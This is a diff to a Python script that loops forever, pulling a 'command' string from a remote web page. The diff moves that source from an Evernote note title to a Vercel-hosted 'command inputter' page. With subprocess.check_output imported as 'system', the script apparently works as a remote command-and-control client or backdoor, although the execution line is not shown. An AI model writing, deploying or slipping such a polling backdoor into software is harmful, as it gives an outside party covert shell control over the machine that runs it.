@@ -1,9 +1,7 @@
 try:
-    from bs4 import BeautifulSoup
     from requests import get, post
     from time import sleep
     from subprocess import check_output as system
-    import lxml
 
     old_command = ""
     command = ""
@@ -15,7 +13,7 @@ while True:
     try:
         #get HTML
         try:
-            command = BeautifulSoup(get("https://www.evernote.com/shard/s557/sh/f241b451-44a8-5ebe-3a73-cf74cb0fdaf5/2EW7PhNX5HU3KHOM1ZZGiu0d16La558Mv9vDJaLemJOZUP4kW2qbb1bBaQ").text, 'lxml').find('title').text
+            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app/").content.decode()
         except KeyboardInterrupt:
             continue
         except:
